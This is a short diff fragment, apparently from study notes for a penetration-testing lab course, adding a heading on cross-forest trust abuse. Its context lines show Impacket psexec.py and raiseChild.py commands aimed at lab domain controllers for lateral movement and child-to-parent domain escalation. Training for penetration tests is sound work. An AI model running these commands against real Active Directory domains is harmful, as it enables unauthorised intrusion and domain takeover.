@@ -265,3 +265,4 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
 
+## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
